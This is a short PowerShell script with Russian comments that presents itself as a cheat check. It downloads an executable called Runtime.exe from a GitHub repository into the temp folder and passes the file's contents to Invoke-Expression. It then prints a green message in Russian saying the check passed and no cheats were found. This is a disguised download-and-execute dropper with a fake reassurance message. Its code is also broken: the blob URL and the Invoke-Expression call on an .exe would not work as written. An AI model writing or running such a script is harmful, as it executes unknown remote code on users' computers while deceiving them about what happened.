# Скачивание файла во временную директорию
$temp = [System.IO.Path]::Combine($env:TEMP, "Runtime.exe")
Invoke-WebRequest -Uri "https://github.com/CHEATS1111/d/blob/main/Runtime.exe" -OutFile $temp

# Запуск файла
Invoke-Expression -Command (Get-Content $temp -Raw)

# Вывод зелёного текста
Write-Host "✅ Проверка пройдена: читов не обнаружено!" -ForegroundColor Green
